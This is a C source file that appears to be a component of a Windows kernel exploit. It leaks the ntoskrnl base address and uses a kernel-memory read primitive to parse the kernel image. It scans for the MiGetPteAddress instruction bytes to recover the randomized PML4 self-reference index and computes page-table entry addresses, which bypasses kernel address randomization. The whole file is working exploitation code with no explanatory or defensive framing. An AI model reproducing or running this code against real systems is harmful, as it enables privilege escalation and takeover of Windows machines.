#include "__win.h"
#include "Psapi.h"
#include "physmem.h"
#include "Util.h"



UINT64 g_enumerated_drivers[2048];
void __get_nt_base(UINT64* base) {
    DWORD cbNeeded;
    EnumDeviceDrivers((PVOID *) g_enumerated_drivers, sizeof(g_enumerated_drivers), &cbNeeded);
    *base = g_enumerated_drivers[0];
}

UINT32 g_PML4_IDX = 0;
void find_pml4_idx() {
    /*
    .text:00000001402DDF10 MiGetPteAddress proc near
    .text:00000001402DDF10 shr     rcx, 9
    .text:00000001402DDF14 mov     rax, 7FFFFFFFF8h
    .text:00000001402DDF1E and     rcx, rax
    .text:00000001402DDF21 mov     rax, 0FFFFF68000000000h
    .text:00000001402DDF2B add     rax, rcx
    .text:00000001402DDF2E retn
    .text:00000001402DDF2E MiGetPteAddress endp
    */

   // Looks for the first 16 bytes of the MiGetPteAddress function
   // and extract the base and index

   if (g_PML4_IDX != 0) {
        return;
   }
    
    UINT64 nt_base;
    __get_nt_base(&nt_base);

    debug_print("Nt base: %016llx\n", nt_base);

    char *image_data = (char *) calloc(1, PAGE_SIZE);
    do_kernel_va_read(nt_base, PAGE_SIZE, image_data);

    UINT32 pe_header_offset = *(UINT32 *)(image_data + 0x3C);

    IMAGE_NT_HEADERS64 *pImageNTHeader = (IMAGE_NT_HEADERS64 *)(image_data + pe_header_offset);

    PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER) 
        (image_data + pe_header_offset + sizeof(UINT32) 
        + (sizeof(struct _IMAGE_FILE_HEADER )) + pImageNTHeader->FileHeader.SizeOfOptionalHeader);
	
	UINT32 code_size  = 0;
    UINT64 code_start = 0;
	for (int i = 0; i < pImageNTHeader->FileHeader.NumberOfSections; i++) {
        //printf("pSectionHeader->Name: %s\n", pSectionHeader->Name);
		if (!memcmp(pSectionHeader->Name, ".text\x00\x00\x00", 8)) {
            // printf("\t\t0x%x\t\tVirtual Size\n", pSectionHeader->Misc.VirtualSize);
            // printf("\t\t0x%x\t\tVirtual Address\n", pSectionHeader->VirtualAddress);
            // printf("\t\t0x%x\t\tSize Of Raw Data\n", pSectionHeader->SizeOfRawData);
            // printf("\t\t0x%x\t\tPointer To Raw Data\n", pSectionHeader->PointerToRawData);
            // printf("\t\t0x%x\t\tPointer To Relocations\n", pSectionHeader->PointerToRelocations);
            // printf("\t\t0x%x\t\tPointer To Line Numbers\n", pSectionHeader->PointerToLinenumbers);
            // printf("\t\t0x%x\t\tNumber Of Relocations\n", pSectionHeader->NumberOfRelocations);
            // printf("\t\t0x%x\t\tNumber Of Line Numbers\n", pSectionHeader->NumberOfLinenumbers);
            // printf("\t\t0x%x\tCharacteristics\n", pSectionHeader->Characteristics);

            code_size = pSectionHeader->Misc.VirtualSize;
            code_size = (code_size + 0xFFF) & ~0xFFF;
            code_start = nt_base + pSectionHeader->VirtualAddress;
            break;
        }
		

		pSectionHeader++;
	}

    free(image_data);

    char *code_data = (char *) calloc(1, code_size);

    char needle[] = "\x48\xc1\xe9\x09\x48\xb8\xf8\xff\xff\xff\x7f\x00\x00\x00\x48\x23";

    do_kernel_va_read(code_start, code_size, code_data);

    char *ptr = (char *) memmem(code_data, code_size, needle, sizeof(needle) - 1);
    if (ptr) {
        UINT32 offset = ptr - code_data;
        debug_print("Found match at offset: %08x\n", offset);

        UINT64 pml4_base = *(UINT64 *) (code_data + offset + (sizeof(needle) - 1) + 3);

        g_PML4_IDX = (pml4_base & 0x0000FFFFFFFFFFFF) >> 9 >> 9 >> 9 >> 12;
        debug_print("-> pml4 base: %016llx\n", pml4_base);
        debug_print("-> pml4_idx found: %08x\n", g_PML4_IDX);
        
    } else {
        debug_print("- error: Needle for PML4 Index not found!\n");
    }
    
    free(code_data);   
}


UINT64 get_pxe_address(UINT64 address) {
	UINT entry = g_PML4_IDX;
	UINT64 result = address >> 9;
	UINT64 lower_boundary = ((UINT64)0xFFFF << 48) | ((UINT64)entry << 39);
	UINT64 upper_boundary = (((UINT64)0xFFFF << 48) | ((UINT64)entry << 39) + 0x8000000000 - 1) & 0xFFFFFFFFFFFFFFF8;
	result = result | lower_boundary;
	result = result & upper_boundary;
	return result;
}



//////////////////////////////////////////////////////////////
/*               Resolve NT Functions                       */
//////////////////////////////////////////////////////////////


_NtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;
_NtFreeVirtualMemory NtFreeVirtualMemory = NULL;

void resolve_nt_functions(void)
{
  NtAllocateVirtualMemory = (_NtAllocateVirtualMemory) 
    GetProcAddress( GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory");

  if (NtAllocateVirtualMemory == NULL)
  {
    debug_print("NtAllocateVirtualMemory wasn't found");
    exit(-1);
  }

  debug_print("NtAllocateVirtualMemory Address: %016llx\n", NtAllocateVirtualMemory);


  NtFreeVirtualMemory = (_NtFreeVirtualMemory) 
    GetProcAddress( GetModuleHandleA("ntdll"), "NtFreeVirtualMemory");

  if (NtFreeVirtualMemory == NULL)
  {
    debug_print("NtFreeVirtualMemory wasn't found");
    exit(-1);
  }

  debug_print("NtFreeVirtualMemory Address: %016llx\n", NtFreeVirtualMemory);
  
}

//////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////


